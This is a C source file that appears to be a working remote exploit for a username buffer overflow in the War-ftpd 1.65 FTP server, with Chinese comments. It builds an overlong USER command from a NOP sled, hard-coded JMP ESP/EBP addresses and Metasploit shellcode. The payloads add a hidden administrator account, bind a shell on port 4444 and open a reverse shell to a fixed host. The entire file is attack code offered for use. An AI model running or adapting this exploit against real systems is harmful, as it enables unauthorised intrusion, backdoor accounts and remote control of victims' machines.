#include <winsock.h>
#include<stdio.h>

#pragma comment(lib,"ws2_32.lib")

prtusg();

int  main(int argc, char *argv[])
{
	WORD wVersionRequested;
	WSADATA wsaData;
    int err;
	int cases;
	char recvBuf[1000];
    char str[1137];//str用于构造含特殊shellcode的用户名,
	//通过检测发现含有shellcode的不包括"USER "字符串(5个字符)的字符数组长度不能超过1132，否则攻击无效
	//由于shellcode可能较长，所以此处预设了最大的字符数组长1132+5=1137
	
	if((argc == 3) ){
		wVersionRequested = MAKEWORD( 1, 1 );	
		err = WSAStartup( wVersionRequested, &wsaData );
		cases=atoi(argv[2]);
		
		//shellcode,添加用户名为zane,密码为enaz的管理员用户:net user zane enaz /add
		/* win32_adduser -  PASS=enaz EXITFUNC=process USER=zane Size=476 Encoder=Alpha2 http://metasploit.com */
		unsigned char scode0[]=
			"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
			"\x49\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x49\x51\x5a\x6a\x4a"
			"\x58\x30\x42\x30\x50\x41\x6b\x41\x41\x5a\x42\x32\x41\x42\x32\x42"
			"\x41\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x7a\x49\x79\x6c\x69"
			"\x78\x51\x54\x57\x70\x43\x30\x63\x30\x4c\x4b\x67\x35\x45\x6c\x6e"
			"\x6b\x71\x6c\x66\x65\x43\x48\x55\x51\x5a\x4f\x4e\x6b\x70\x4f\x42"
			"\x38\x4c\x4b\x43\x6f\x51\x30\x56\x61\x78\x6b\x30\x49\x4c\x4b\x76"
			"\x54\x4c\x4b\x65\x51\x7a\x4e\x66\x51\x6b\x70\x5a\x39\x6e\x4c\x4d"
			"\x54\x4f\x30\x73\x44\x56\x67\x68\x41\x5a\x6a\x66\x6d\x44\x41\x6a"
			"\x62\x58\x6b\x48\x74\x65\x6b\x72\x74\x31\x34\x77\x74\x74\x35\x79"
			"\x75\x6c\x4b\x73\x6f\x67\x54\x64\x41\x7a\x4b\x62\x46\x6e\x6b\x64"
			"\x4c\x30\x4b\x6e\x6b\x33\x6f\x75\x4c\x37\x71\x48\x6b\x6e\x6b\x57"
			"\x6c\x4c\x4b\x77\x71\x58\x6b\x4c\x49\x61\x4c\x56\x44\x47\x74\x69"
			"\x53\x70\x31\x4b\x70\x45\x34\x4c\x4b\x31\x50\x64\x70\x6f\x75\x49"
			"\x50\x52\x58\x36\x6c\x4c\x4b\x43\x70\x64\x4c\x4e\x6b\x74\x30\x45"
			"\x4c\x4c\x6d\x4e\x6b\x63\x58\x33\x38\x6a\x4b\x47\x79\x4c\x4b\x4d"
			"\x50\x68\x30\x37\x70\x73\x30\x53\x30\x6e\x6b\x35\x38\x55\x6c\x53"
			"\x6f\x47\x41\x6a\x56\x73\x50\x52\x76\x4b\x39\x7a\x58\x4f\x73\x6b"
			"\x70\x63\x4b\x76\x30\x42\x48\x31\x6e\x78\x58\x78\x62\x62\x53\x62"
			"\x48\x7a\x38\x4b\x4e\x4f\x7a\x66\x6e\x30\x57\x69\x6f\x38\x67\x61"
			"\x73\x50\x6d\x55\x34\x66\x4e\x33\x55\x73\x48\x35\x35\x61\x30\x54"
			"\x6f\x45\x33\x31\x30\x50\x6e\x72\x45\x50\x74\x65\x70\x30\x75\x41"
			"\x63\x70\x65\x73\x42\x37\x50\x51\x6a\x62\x41\x62\x4e\x72\x45\x71"
			"\x30\x71\x75\x70\x6e\x50\x61\x72\x5a\x37\x50\x46\x4f\x43\x71\x71"
			"\x54\x43\x74\x41\x30\x36\x46\x51\x36\x55\x70\x70\x6e\x43\x55\x70"
			"\x74\x55\x70\x30\x6c\x72\x4f\x32\x43\x35\x31\x50\x6c\x70\x67\x64"
			"\x32\x72\x4f\x54\x35\x42\x50\x35\x70\x32\x61\x71\x74\x42\x4d\x62"
			"\x49\x30\x6e\x55\x39\x33\x43\x73\x44\x71\x62\x51\x71\x72\x54\x50"
			"\x6f\x54\x32\x31\x63\x45\x70\x71\x6a\x42\x41\x62\x4e\x41\x75\x55"
			"\x70\x46\x4f\x30\x41\x30\x44\x30\x44\x43\x30\x4a";
		
		/* win32_adduser -  PASS=enaz EXITFUNC=thread USER=zane Size=476 Encoder=Alpha2 http://metasploit.com */
		unsigned char scode1[] =
			"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
			"\x37\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x46"
			"\x58\x30\x41\x31\x50\x41\x42\x6b\x42\x41\x56\x32\x42\x42\x42\x32"
			"\x41\x41\x30\x41\x41\x58\x50\x38\x42\x42\x75\x39\x79\x6b\x4c\x5a"
			"\x48\x62\x64\x67\x70\x73\x30\x35\x50\x6e\x6b\x61\x55\x57\x4c\x4e"
			"\x6b\x53\x4c\x67\x75\x42\x58\x63\x31\x7a\x4f\x4e\x6b\x30\x4f\x34"
			"\x58\x4e\x6b\x71\x4f\x51\x30\x36\x61\x38\x6b\x30\x49\x6e\x6b\x45"
			"\x64\x6c\x4b\x65\x51\x5a\x4e\x45\x61\x4b\x70\x6a\x39\x4e\x4c\x6b"
			"\x34\x59\x50\x30\x74\x74\x47\x4b\x71\x69\x5a\x64\x4d\x56\x61\x6b"
			"\x72\x78\x6b\x6c\x34\x75\x6b\x30\x54\x64\x64\x67\x74\x41\x65\x69"
			"\x75\x4e\x6b\x53\x6f\x55\x74\x56\x61\x7a\x4b\x45\x36\x4c\x4b\x76"
			"\x6c\x70\x4b\x6e\x6b\x73\x6f\x65\x4c\x53\x31\x58\x6b\x4e\x6b\x47"
			"\x6c\x4c\x4b\x33\x31\x4a\x4b\x4b\x39\x51\x4c\x51\x34\x55\x54\x4b"
			"\x73\x54\x71\x6b\x70\x32\x44\x6c\x4b\x37\x30\x66\x50\x6e\x65\x6f"
			"\x30\x44\x38\x36\x6c\x6e\x6b\x71\x50\x76\x6c\x4e\x6b\x72\x50\x77"
			"\x6c\x6c\x6d\x6c\x4b\x73\x58\x76\x68\x58\x6b\x47\x79\x4e\x6b\x4f"
			"\x70\x4c\x70\x63\x30\x53\x30\x45\x50\x4c\x4b\x63\x58\x47\x4c\x71"
			"\x4f\x36\x51\x49\x66\x65\x30\x33\x66\x4f\x79\x4a\x58\x4b\x33\x4f"
			"\x30\x71\x6b\x30\x50\x72\x48\x4a\x4f\x68\x4e\x4d\x30\x53\x50\x73"
			"\x58\x6d\x48\x49\x6e\x6f\x7a\x64\x4e\x71\x47\x49\x6f\x6b\x57\x30"
			"\x63\x30\x6d\x75\x34\x36\x4e\x75\x35\x33\x48\x43\x55\x35\x70\x36"
			"\x4f\x73\x53\x65\x70\x30\x6e\x42\x45\x73\x44\x45\x70\x74\x35\x62"
			"\x53\x71\x75\x34\x32\x41\x30\x32\x5a\x72\x41\x32\x4e\x71\x75\x57"
			"\x50\x43\x55\x72\x4e\x52\x41\x50\x7a\x31\x30\x64\x6f\x67\x31\x71"
			"\x54\x77\x34\x35\x70\x77\x56\x41\x36\x51\x30\x72\x4e\x32\x45\x34"
			"\x34\x31\x30\x50\x6c\x52\x4f\x52\x43\x65\x31\x50\x6c\x70\x67\x62"
			"\x52\x62\x4f\x53\x45\x44\x30\x61\x30\x73\x71\x30\x64\x70\x6d\x52"
			"\x49\x32\x4e\x50\x69\x50\x73\x64\x34\x70\x72\x50\x61\x50\x74\x32"
			"\x4f\x64\x32\x41\x63\x45\x70\x30\x7a\x41\x71\x30\x6e\x50\x65\x75"
			"\x70\x74\x6f\x51\x51\x43\x74\x50\x44\x67\x70\x46";
		
		//攻击本地主机时，打开CMD界面
                             /*来自《缓冲区溢出就是这么简单-学院-黑客基地》
                               www.hackbase.com/tech/2008-08-12/41442.html*/
		unsigned char scode2[] =
			"\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53"
			"\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6"
			"\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA"
			"\x77\x1d\x80\x7c"
			"\x52\x8D\x45\xF4\x50\xFF\x55\xF0"
			"\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D\x89\x45\xF4\xB8\x61\x6E\x64\x2E"
			"\x89\x45\xF8\xB8\x63\x6F\x6D\x22\x89\x45\xFC\x33\xD2\x88\x55\xFF\x8D\x45\xF4"
			"\x50\xB8"
			"\xc7\x93\xbf\x77"
			"\xFF\xD0"
			"\x83\xC4\x12\x5D" ;

		//绑定一个shell在4444端口,可远程telnet登录
		/* win32_bind -  EXITFUNC=process LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com */
		unsigned char scode3[] =
			"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
			"\x49\x49\x49\x49\x48\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x49"
			"\x58\x30\x41\x31\x50\x42\x41\x6b\x42\x41\x59\x42\x32\x42\x41\x32"
			"\x41\x41\x30\x41\x41\x58\x50\x38\x42\x42\x75\x6b\x59\x69\x6c\x30"
			"\x6a\x7a\x4b\x32\x6d\x6b\x58\x68\x79\x69\x6f\x69\x6f\x4b\x4f\x43"
			"\x50\x4c\x4b\x70\x6c\x76\x44\x71\x34\x4c\x4b\x30\x45\x45\x6c\x6e"
			"\x6b\x51\x6c\x43\x35\x33\x48\x33\x31\x78\x6f\x4c\x4b\x52\x6f\x77"
			"\x68\x6e\x6b\x33\x6f\x65\x70\x45\x51\x5a\x4b\x61\x59\x6e\x6b\x50"
			"\x34\x4e\x6b\x67\x71\x48\x6e\x76\x51\x6f\x30\x6c\x59\x4e\x4c\x6f"
			"\x74\x59\x50\x74\x34\x54\x47\x6f\x31\x48\x4a\x46\x6d\x53\x31\x4b"
			"\x72\x4a\x4b\x69\x64\x55\x6b\x30\x54\x75\x74\x76\x48\x61\x65\x59"
			"\x75\x6c\x4b\x71\x4f\x45\x74\x36\x61\x7a\x4b\x70\x66\x4e\x6b\x66"
			"\x6c\x72\x6b\x6c\x4b\x51\x4f\x67\x6c\x37\x71\x6a\x4b\x46\x63\x74"
			"\x6c\x6c\x4b\x6d\x59\x30\x6c\x45\x74\x37\x6c\x71\x71\x69\x53\x77"
			"\x41\x4b\x6b\x63\x54\x6c\x4b\x61\x53\x34\x70\x4c\x4b\x33\x70\x64"
			"\x4c\x6c\x4b\x70\x70\x75\x4c\x6e\x4d\x6e\x6b\x47\x30\x54\x48\x41"
			"\x4e\x30\x68\x6c\x4e\x30\x4e\x56\x6e\x48\x6c\x42\x70\x6b\x4f\x38"
			"\x56\x72\x46\x76\x33\x51\x76\x50\x68\x47\x43\x30\x32\x73\x58\x34"
			"\x37\x44\x33\x30\x32\x33\x6f\x46\x34\x59\x6f\x4a\x70\x51\x78\x38"
			"\x4b\x58\x6d\x79\x6c\x57\x4b\x52\x70\x69\x6f\x7a\x76\x73\x6f\x6d"
			"\x59\x6d\x35\x51\x76\x6d\x51\x5a\x4d\x76\x68\x77\x72\x62\x75\x33"
			"\x5a\x36\x62\x6b\x4f\x68\x50\x55\x38\x4e\x39\x36\x69\x4c\x35\x4c"
			"\x6d\x33\x67\x4b\x4f\x4e\x36\x51\x43\x63\x63\x76\x33\x30\x53\x53"
			"\x63\x50\x43\x56\x33\x70\x43\x30\x53\x6b\x4f\x38\x50\x53\x56\x65"
			"\x38\x76\x71\x31\x4c\x45\x36\x61\x43\x6f\x79\x4a\x41\x4c\x55\x41"
			"\x78\x6c\x64\x35\x4a\x74\x30\x4f\x37\x63\x67\x79\x6f\x79\x46\x33"
			"\x5a\x32\x30\x41\x41\x52\x75\x6b\x4f\x5a\x70\x65\x38\x59\x34\x4c"
			"\x6d\x66\x4e\x68\x69\x70\x57\x4b\x4f\x69\x46\x31\x43\x50\x55\x6b"
			"\x4f\x6a\x70\x42\x48\x4b\x55\x52\x69\x4e\x66\x52\x69\x70\x57\x6b"
			"\x4f\x68\x56\x66\x30\x43\x64\x70\x54\x61\x45\x6b\x4f\x6a\x70\x6f"
			"\x63\x30\x68\x6d\x37\x41\x69\x69\x56\x54\x39\x53\x67\x39\x6f\x4a"
			"\x76\x66\x35\x6b\x4f\x4e\x30\x62\x46\x73\x5a\x71\x74\x41\x76\x61"
			"\x78\x75\x33\x30\x6d\x4d\x59\x58\x65\x70\x6a\x36\x30\x52\x79\x34"
			"\x69\x4a\x6c\x6e\x69\x5a\x47\x30\x6a\x52\x64\x6b\x39\x79\x72\x35"
			"\x61\x6f\x30\x38\x73\x4c\x6a\x4b\x4e\x43\x72\x74\x6d\x79\x6e\x30"
			"\x42\x36\x4c\x6c\x53\x6c\x4d\x50\x7a\x57\x48\x6e\x4b\x4c\x6b\x4e"
			"\x4b\x32\x48\x41\x62\x4b\x4e\x6f\x43\x56\x76\x4b\x4f\x42\x55\x77"
			"\x34\x6b\x4f\x4b\x66\x43\x6b\x63\x67\x46\x32\x63\x61\x76\x31\x56"
			"\x31\x51\x7a\x34\x41\x66\x31\x51\x41\x46\x35\x46\x31\x4b\x4f\x68"
			"\x50\x50\x68\x4e\x4d\x6e\x39\x33\x35\x58\x4e\x71\x43\x69\x6f\x6e"
			"\x36\x52\x4a\x4b\x4f\x69\x6f\x45\x67\x6b\x4f\x4a\x70\x4e\x6b\x53"
			"\x67\x4b\x4c\x6e\x63\x59\x54\x35\x34\x79\x6f\x6e\x36\x46\x32\x79"
			"\x6f\x6e\x30\x35\x38\x53\x4e\x38\x58\x6b\x52\x53\x43\x31\x43\x4b"
			"\x4f\x6e\x36\x69\x6f\x58\x50\x49";
		//实现的功能与scode0一样，只是编码方式为PexAlphaNum
		/* win32_adduser -  PASS=enaz EXITFUNC=process USER=zane Size=489 Encoder=PexAlphaNum http://metasploit.com */
		unsigned char scode4[] =
			"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
			"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
			"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
			"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
			"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"
			"\x42\x50\x42\x50\x42\x50\x4b\x38\x45\x34\x4e\x33\x4b\x58\x4e\x37"
			"\x45\x50\x4a\x57\x41\x30\x4f\x4e\x4b\x48\x4f\x34\x4a\x51\x4b\x38"
			"\x4f\x45\x42\x52\x41\x30\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x58"
			"\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x59\x4e\x4a\x46\x48\x42\x4c"
			"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
			"\x46\x4f\x4b\x53\x46\x35\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x38"
			"\x4f\x35\x46\x42\x41\x30\x4b\x4e\x48\x56\x4b\x58\x4e\x50\x4b\x44"
			"\x4b\x48\x4f\x35\x4e\x51\x41\x30\x4b\x4e\x4b\x38\x4e\x31\x4b\x48"
			"\x41\x50\x4b\x4e\x49\x48\x4e\x35\x46\x52\x46\x50\x43\x4c\x41\x53"
			"\x42\x4c\x46\x56\x4b\x58\x42\x44\x42\x33\x45\x38\x42\x4c\x4a\x37"
			"\x4e\x50\x4b\x38\x42\x34\x4e\x50\x4b\x58\x42\x37\x4e\x51\x4d\x4a"
			"\x4b\x38\x4a\x46\x4a\x30\x4b\x4e\x49\x50\x4b\x38\x42\x58\x42\x4b"
			"\x42\x30\x42\x30\x42\x50\x4b\x38\x4a\x36\x4e\x53\x4f\x35\x41\x33"
			"\x48\x4f\x42\x46\x48\x45\x49\x48\x4a\x4f\x43\x58\x42\x4c\x4b\x57"
			"\x42\x35\x4a\x46\x50\x47\x4a\x4d\x44\x4e\x43\x57\x4a\x56\x4a\x39"
			"\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x46\x4d\x36"
			"\x46\x46\x50\x52\x45\x46\x4a\x57\x45\x36\x42\x32\x4f\x52\x43\x56"
			"\x42\x52\x50\x46\x45\x56\x46\x57\x42\x52\x45\x47\x43\x57\x45\x36"
			"\x44\x37\x42\x52\x4c\x57\x41\x46\x50\x46\x45\x56\x42\x52\x45\x36"
			"\x50\x46\x41\x46\x4c\x37\x42\x52\x4f\x52\x41\x44\x46\x54\x46\x44"
			"\x42\x32\x48\x32\x48\x52\x42\x52\x50\x36\x45\x56\x46\x37\x42\x32"
			"\x4e\x46\x4f\x56\x43\x36\x41\x46\x4e\x36\x47\x56\x44\x57\x4f\x36"
			"\x45\x57\x42\x47\x42\x32\x41\x34\x46\x36\x4d\x56\x49\x46\x50\x36"
			"\x49\x56\x43\x37\x46\x57\x44\x47\x41\x46\x46\x57\x4f\x46\x44\x57"
			"\x43\x47\x42\x32\x4c\x47\x41\x36\x50\x36\x45\x46\x42\x32\x4f\x32"
			"\x41\x34\x46\x54\x46\x34\x42\x30\x5a";
		//该shellcode用于获取被攻击的远程主机shell，但未能成功使用，此处用于占位，以待来日研究
		/* win32_reverse -  EXITFUNC=process LHOST=192.168.85.1 LPORT=4321 Size=636 Encoder=Alpha2 http://metasploit.com */
		unsigned char scode5[] =
			"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
			"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x48\x49\x51\x5a\x6a\x66"
			"\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x76\x42\x32\x42\x41\x32"
			"\x41\x41\x30\x41\x41\x58\x50\x38\x42\x42\x75\x49\x79\x4b\x4c\x72"
			"\x4a\x5a\x4b\x72\x6d\x49\x78\x5a\x59\x6b\x4f\x4b\x4f\x49\x6f\x71"
			"\x70\x4e\x6b\x30\x6c\x67\x54\x55\x74\x4c\x4b\x50\x45\x75\x6c\x4e"
			"\x6b\x73\x4c\x37\x75\x43\x48\x34\x41\x68\x6f\x6e\x6b\x30\x4f\x37"
			"\x68\x6e\x6b\x63\x6f\x31\x30\x44\x41\x5a\x4b\x70\x49\x6c\x4b\x47"
			"\x44\x4c\x4b\x73\x31\x68\x6e\x46\x51\x6f\x30\x4d\x49\x6c\x6c\x6b"
			"\x34\x79\x50\x72\x54\x53\x37\x48\x41\x78\x4a\x46\x6d\x36\x61\x39"
			"\x52\x58\x6b\x4a\x54\x65\x6b\x76\x34\x31\x34\x71\x38\x62\x55\x68"
			"\x65\x4e\x6b\x71\x4f\x65\x74\x65\x51\x78\x6b\x33\x56\x4e\x6b\x34"
			"\x4c\x30\x4b\x6c\x4b\x33\x6f\x45\x4c\x43\x31\x4a\x4b\x65\x53\x76"
			"\x4c\x6c\x4b\x4d\x59\x30\x6c\x76\x44\x77\x6c\x35\x31\x4f\x33\x35"
			"\x61\x49\x4b\x42\x44\x6c\x4b\x70\x43\x44\x70\x4e\x6b\x43\x70\x34"
			"\x4c\x6e\x6b\x34\x30\x67\x6c\x6e\x4d\x6e\x6b\x71\x50\x76\x68\x31"
			"\x4e\x51\x78\x6c\x4e\x50\x4e\x36\x6e\x7a\x4c\x70\x50\x69\x6f\x39"
			"\x46\x71\x76\x51\x43\x53\x56\x73\x58\x74\x73\x77\x42\x75\x38\x30"
			"\x77\x72\x53\x74\x72\x73\x6f\x30\x54\x69\x6f\x6a\x70\x32\x48\x7a"
			"\x6b\x38\x6d\x49\x6c\x65\x6b\x42\x70\x6b\x4f\x7a\x76\x61\x4f\x6d"
			"\x59\x4a\x45\x65\x36\x4e\x61\x58\x6d\x76\x68\x56\x62\x63\x65\x42"
			"\x4a\x46\x62\x4b\x4f\x58\x50\x53\x58\x6e\x39\x75\x59\x4b\x45\x6c"
			"\x6d\x73\x67\x4b\x4f\x5a\x76\x31\x43\x31\x43\x41\x43\x62\x73\x73"
			"\x73\x36\x33\x32\x63\x41\x43\x49\x6f\x78\x50\x71\x78\x4b\x70\x4c"
			"\x68\x52\x75\x35\x51\x53\x56\x51\x78\x54\x50\x38\x61\x41\x76\x52"
			"\x73\x6d\x59\x4a\x41\x6d\x45\x43\x58\x48\x6c\x4b\x49\x6d\x7a\x35"
			"\x30\x62\x77\x69\x6f\x6e\x36\x50\x6a\x64\x50\x42\x71\x63\x65\x4b"
			"\x4f\x38\x50\x72\x46\x72\x4a\x31\x74\x52\x46\x33\x58\x33\x53\x32"
			"\x4d\x71\x7a\x46\x30\x72\x79\x65\x79\x5a\x6c\x6e\x69\x4d\x37\x30"
			"\x6a\x32\x64\x6b\x39\x68\x62\x57\x41\x4b\x70\x4c\x33\x6f\x5a\x6d"
			"\x45\x4d\x59\x79\x6d\x39\x6e\x33\x72\x34\x6d\x4b\x4e\x62\x62\x36"
			"\x4c\x6e\x6d\x62\x5a\x55\x68\x6e\x4b\x6c\x6b\x4c\x6b\x35\x38\x30"
			"\x72\x6b\x4e\x68\x33\x45\x46\x4b\x4f\x41\x65\x64\x68\x69\x6f\x4e"
			"\x36\x73\x6b\x71\x47\x30\x52\x50\x51\x62\x71\x30\x51\x43\x5a\x46"
			"\x61\x41\x41\x53\x61\x73\x65\x36\x31\x79\x6f\x4e\x30\x50\x68\x6c"
			"\x6d\x39\x49\x43\x35\x7a\x6e\x41\x43\x79\x6f\x6a\x76\x32\x4a\x6b"
			"\x4f\x6b\x4f\x46\x57\x6b\x4f\x6e\x30\x75\x38\x7a\x47\x33\x49\x78"
			"\x46\x30\x79\x4b\x4f\x61\x65\x47\x74\x59\x6f\x6a\x76\x6b\x4f\x73"
			"\x47\x6b\x4c\x4b\x4f\x6e\x30\x42\x48\x31\x6e\x4b\x68\x48\x62\x61"
			"\x63\x32\x73\x39\x6f\x49\x46\x49\x6f\x4e\x30\x66";
		
		
		
		
		
		
		
		if ( err != 0 )
		{
			return -1;
		}	
		
		if ( LOBYTE( wsaData.wVersion ) != 1 ||
			HIBYTE( wsaData.wVersion ) != 1 )
		{
			WSACleanup( );
			return -1;
		}
		
		
		SOCKET sockClient = socket(AF_INET,SOCK_STREAM,0);//发送命令的套接字
		SOCKADDR_IN addrSrv;
		addrSrv.sin_addr.S_un.S_addr=inet_addr(argv[1]);
		addrSrv.sin_family = AF_INET;
		addrSrv.sin_port = htons(21);
		
		//连接ftp服务端
		int	b = connect(sockClient, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));
		if (b == SOCKET_ERROR)
		{
			printf("连接失败\n");
		}
		
		//接收信息并打印
		
		memset(recvBuf, 0, 256);
		recv(sockClient,recvBuf,256,0);
		printf(recvBuf);
		printf("\n");
		
		
		memset(str, 0x90, 1128);	//将攻击命令字符数组各位初始化为nop 0x90
		memcpy(str,"USER ",5);
		
		switch(cases){
		case 0:
		default:
			memcpy(str+490, "\x12\x45\xfa\x7f", 4); 
            memcpy(str+498, scode5, sizeof(scode5)-1); 
			printf("使用windows 2k/xp/2003 的通用的JMP ESP:0x7ffa4512\n");
			printf("在远程主机新建密码为enaz管理员用户zane,EXITFUNC=process\n");
			break;
		case 1:
			memcpy(str+490, "\x12\x45\xfa\x7f", 4); 
            memcpy(str+498, scode3, sizeof(scode3)-1); 
			printf("使用windows 2k/xp/2003 的通用的JMP ESP:0x7ffa4512\n");
			printf("绑定一个shell在4444端口,可远程telnet登录:\n");
			printf("登录命令:telnet <ip> 4444\n");
			break;
		case 2:
			memcpy(str+490, "\xfb\xc5\xd7\x77", 4); 
            memcpy(str+498, scode2, sizeof(scode2)-1); 
			printf("使用windowsXP user32.dll的JMP ESP:0x77d7c5fb\n");
			printf("攻击本地主机127.0.0.1时弹出CMD界面\n");
			break;
		case 3:
			memcpy(str+490, "\x7b\x4d\x83\x7c", 4);
            memcpy(str+498, scode1, sizeof(scode1)-1); 
			printf("使用windowsXP kernel32.dll的JMP ESP:0x7c834d7b\n");
			printf("在远程主机新建密码为enaz管理员用户zane,EXITFUNC=thread\n");
			break;
		case 4:
			memcpy(str+490, "\x67\x49\xfa\x7f", 4); 
            memcpy(str+586, scode1, sizeof(scode1)-1); 
			printf("使用windows 2k/xp/2003 的通用的JMP EBP:0x7ffa4967\n");
			printf("在远程主机新建密码为enaz管理员用户zane,EXITFUNC=process\n");
			break;
		}
		
		
		
		
		memcpy(str+1135, "\r\n", 2);	
		
		send(sockClient,str, strlen(str), 0);//发送命令
		
		memset(recvBuf, 0, 256);
		recv(sockClient,recvBuf,256,0);
		printf(recvBuf);
		printf("\n攻击完成！");
		
		closesocket(sockClient);
		WSACleanup();
		return true;
		} 
		else
		{
			prtusg();
			
		}
		
		
	}
	
	
	int prtusg(){
		printf("################################################################\n");
		printf("#            War-ftpd1.65UserNameBasedOverFlowAttack           #\n");
		printf("#                         Coded by Zane                        #\n");
		printf("################################################################\n");
		printf("#用法:WarftpAttack <host> <AttackNumber>                       #\n");
		printf("#例子:  WarftpAttack 192.168.85.3 0                            #\n");
		printf("################################################################\n");
		printf("             AttackNumber 0:\n"            );
		printf("使用windows 2k/xp/2003 的通用的JMP ESP:0x7ffa4512\n");
		printf("在远程主机新建密码为enaz管理员用户zane,EXITFUNC=process\n");
		printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
		printf("             AttackNumber 1:\n"            );
		printf("使用windows 2k/xp/2003 的通用的JMP ESP:0x7ffa4512\n");
		printf("绑定一个shell在4444端口,可远程telnet登录\n");
		printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
		printf("             AttackNumber 2:\n"            );
		printf("使用windowsXP user32.dll的JMP ESP:0x77d7c5fb\n");
		printf("攻击本地主机127.0.0.1时弹出CMD界面\n");
		printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
		printf("             AttackNumber 3:\n"            );
		printf("使用windowsXP kernel32.dll的JMP ESP:0x7c834d7b\n");
		printf("在远程主机新建密码为enaz管理员用户zane,EXITFUNC=thread\n");
		printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
		printf("             AttackNumber 4:\n"            );
		printf("使用windows 2k/xp/2003 的通用的JMP EBP:0x7ffa4967\n");
		printf("在远程主机新建密码为enaz管理员用户zane,EXITFUNC=process\n");
		printf("################################################################\n");
        printf("#0号攻击在Windows2K/XP/2003上测试通过,其它只在XP上通过         #\n");
		printf("################################################################\n");
		
		return 0;
	}